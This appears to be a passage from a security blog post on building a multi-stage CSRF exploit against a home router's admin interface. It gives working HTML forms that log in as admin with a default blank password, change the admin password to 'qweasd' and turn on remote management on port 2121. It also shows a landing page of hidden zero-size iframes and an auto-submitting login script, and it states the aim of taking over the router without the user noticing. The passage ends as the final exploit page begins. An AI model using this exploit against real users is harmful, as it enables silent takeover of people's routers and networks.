			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;form name="loginForm" method="POST" action="http://192.168.0.1/login.htm"&gt;
	&lt;input type="hidden" name="page" value="login" /&gt;
	&lt;input type="hidden" name="submitType" value="0" /&gt;
	&lt;input type="hidden" name="sel_userid" value="admin" /&gt;
	&lt;input type="hidden" name="userid" value="" /&gt;
	&lt;input type="hidden" name="passwd" value="" /&gt;
	&lt;input type="hidden" name="captchapwd" value="" /&gt;
&lt;/form&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98772e85fe967095788-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e85fe967095788-2">2</div><div class="crayon-num" data-line="crayon-53c98772e85fe967095788-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e85fe967095788-4">4</div><div class="crayon-num" data-line="crayon-53c98772e85fe967095788-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e85fe967095788-6">6</div><div class="crayon-num" data-line="crayon-53c98772e85fe967095788-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e85fe967095788-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98772e85fe967095788-1"><span class="crayon-o">&lt;</span><span class="crayon-e">form </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"loginForm"</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-o">=</span><span class="crayon-s">"POST"</span><span class="crayon-h"> </span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-s">"http://192.168.0.1/login.htm"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e85fe967095788-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"page"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"login"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e85fe967095788-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"submitType"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e85fe967095788-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"sel_userid"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"admin"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e85fe967095788-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"userid"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e85fe967095788-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"passwd"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e85fe967095788-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"captchapwd"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e85fe967095788-8"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">form</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0041 seconds] -->
<p>&nbsp;</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98772e860e132296372" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;form name="adminForm" method="POST" action="http://192.168.0.1/tools_admin.htm"&gt;
	&lt;input type="hidden" name="page" value="tools_admin" /&gt;
	&lt;input type="hidden" name="admin_password1" value="qweasd" /&gt;
	&lt;input type="hidden" name="admin_password2" value="qweasd" /&gt;
	&lt;input type="hidden" name="hostname" value="REMOTEENABLED" /&gt;
	&lt;input type="hidden" name="graphical_enable" value="1" /&gt;
	&lt;input type="hidden" name="remote_enable" value="1" /&gt;
	&lt;input type="hidden" name="remote_http_management_port" value="2121" /&gt;
	&lt;input type="hidden" name="remote_inbound_filter" value="11" /&gt;
&lt;/form&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98772e860e132296372-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e860e132296372-2">2</div><div class="crayon-num" data-line="crayon-53c98772e860e132296372-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e860e132296372-4">4</div><div class="crayon-num" data-line="crayon-53c98772e860e132296372-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e860e132296372-6">6</div><div class="crayon-num" data-line="crayon-53c98772e860e132296372-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e860e132296372-8">8</div><div class="crayon-num" data-line="crayon-53c98772e860e132296372-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e860e132296372-10">10</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98772e860e132296372-1"><span class="crayon-o">&lt;</span><span class="crayon-e">form </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"adminForm"</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-o">=</span><span class="crayon-s">"POST"</span><span class="crayon-h"> </span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-s">"http://192.168.0.1/tools_admin.htm"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e860e132296372-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"page"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"tools_admin"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e860e132296372-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"admin_password1"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"qweasd"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e860e132296372-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"admin_password2"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"qweasd"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e860e132296372-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"hostname"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"REMOTEENABLED"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e860e132296372-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"graphical_enable"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"1"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e860e132296372-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"remote_enable"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"1"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e860e132296372-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"remote_http_management_port"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"2121"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e860e132296372-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"remote_inbound_filter"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"11"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e860e132296372-10"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">form</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0053 seconds] -->
<p><strong>Â The problem</strong></p>
<p>In order to get a reliable CSRF exploit for this, we&#8217;d really like a single page we can send an user to, and it takes care of making these requests to do the exploit. But this turned out to be not quite so easy, and googling turned up very few suggestion for how to make several requests in order and time them correctly to allow authentication before the CSRF attack request. Here were some of the ways I tried:</p>
<p><strong>Failed solution 1: A single page with 2 forms, calling document.formname.submit(); in sequence</strong></p>
<p>This didn&#8217;t work. What ended up happening is that the login form wasn&#8217;t submitted. Also because we submit the form, we end up with the problem that the browser navigates to action URL. This is because of the default target of the form(_self).</p>
<p><strong><strong>Failed solutionÂ </strong>2: A single page with 2 forms that has a target _blank or an iframe</strong></p>
<p>Given the navigation issue I encountered in my first attempt, I started testing out how the target of the form affected things. As it turns out, modern browsers are really not big fans of iframes or new windows. Targeting a frame simply didn&#8217;t work. And when you use _blank as a target, the user has to explicitly allow it in modern browsers. In order to exploit this reliably, we can&#8217;t rely on user interaction.</p>
<p><strong><strong>Failed solutionÂ </strong>3: XMLHttp requests</strong></p>
<p>AJAX is wonderful. So I figured why not try and come up with a solution using XMLHttp and a bit of Javascript. This fell flat very quickly, as XMLHttp respects same origin policy.</p>
<p><strong>The solution</strong></p>
<p>A solution to this would require following:</p>
<ul>
<li>Control of timing between requests</li>
<li>To still have control of the page the user loaded, even if the form navigates to a target.</li>
<li>No popups</li>
<li>Little, if any, indication to the user that their router is being owned</li>
</ul>
<p>My solution ended up being a bit less neat. However it works quite well against any default browser without any noscript and such(Which would break most CSRF attacks requiring to post, unless you want to rely on user input). It&#8217;s quite a bit along the line of the idea of setting each form target to a different frame. But since I couldn&#8217;t get them to target an iframe in a single page, I split the payload into 3 parts.</p>
<ol>
<li>Landing page with 2 iframes, each containing their own payload</li>
<li>A login request</li>
<li>A delayed CSRF attack against the vulnerable page as desired</li>
</ol>
<p>The main landing pages is quite simple, as it just loads each page for execution:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98772e861b681205983" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;iframe src="login.html" width="0" height="0"&gt;
&lt;/iframe&gt;
&lt;iframe src="exploit.html"  width="0" height="0"&gt;
&lt;/iframe&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98772e861b681205983-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e861b681205983-2">2</div><div class="crayon-num" data-line="crayon-53c98772e861b681205983-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e861b681205983-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98772e861b681205983-1"><span class="crayon-o">&lt;</span><span class="crayon-e">iframe </span><span class="crayon-v">src</span><span class="crayon-o">=</span><span class="crayon-s">"login.html"</span><span class="crayon-h"> </span><span class="crayon-v">width</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-h"> </span><span class="crayon-v">height</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e861b681205983-2"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">iframe</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e861b681205983-3"><span class="crayon-o">&lt;</span><span class="crayon-e">iframe </span><span class="crayon-v">src</span><span class="crayon-o">=</span><span class="crayon-s">"exploit.html"</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">width</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-h"> </span><span class="crayon-v">height</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e861b681205983-4"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">iframe</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0015 seconds] -->
<p>By setting the width and height, all you&#8217;re left with is a tiny dot on the screen. This could be mitigated by doing some styling potentially to render it off screen.</p>
<p>Second step is to log in. Here we rely on the fact that the admin user by default does not have any password set.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98772e8625338839163" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;form name="loginForm" method="POST" action="http://192.168.0.1/login.htm"&gt;
	&lt;input type="hidden" name="page" value="login" /&gt;
	&lt;input type="hidden" name="submitType" value="0" /&gt;
	&lt;input type="hidden" name="sel_userid" value="admin" /&gt;
	&lt;input type="hidden" name="userid" value="" /&gt;
	&lt;input type="hidden" name="passwd" value="qweasd" /&gt;
	&lt;input type="hidden" name="captchapwd" value="" /&gt;
&lt;/form&gt;
&lt;script type="text/javascript"&gt;
	document.loginForm.submit();
&lt;/script&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98772e8625338839163-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e8625338839163-2">2</div><div class="crayon-num" data-line="crayon-53c98772e8625338839163-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e8625338839163-4">4</div><div class="crayon-num" data-line="crayon-53c98772e8625338839163-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e8625338839163-6">6</div><div class="crayon-num" data-line="crayon-53c98772e8625338839163-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e8625338839163-8">8</div><div class="crayon-num" data-line="crayon-53c98772e8625338839163-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e8625338839163-10">10</div><div class="crayon-num" data-line="crayon-53c98772e8625338839163-11">11</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98772e8625338839163-1"><span class="crayon-o">&lt;</span><span class="crayon-e">form </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"loginForm"</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-o">=</span><span class="crayon-s">"POST"</span><span class="crayon-h"> </span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-s">"http://192.168.0.1/login.htm"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e8625338839163-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"page"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"login"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e8625338839163-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"submitType"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e8625338839163-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"sel_userid"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"admin"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e8625338839163-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"userid"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e8625338839163-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"passwd"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"qweasd"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e8625338839163-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"captchapwd"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e8625338839163-8"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-e">form</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e8625338839163-9"><span class="crayon-ta">&lt;script </span><span class="crayon-e ">type</span><span class="crayon-o">=</span><span class="crayon-s">"text/javascript"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e8625338839163-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-v">loginForm</span><span class="crayon-sy">.</span><span class="crayon-e">submit</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98772e8625338839163-11"><span class="crayon-ta">&lt;/script&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0048 seconds] -->
<p>Nothing fancy really happens here. We just have to make sure that the user is authenticated for our second stage, which is the CSRF attack which exploits the real weakness in the router:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98772e862e760724886" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
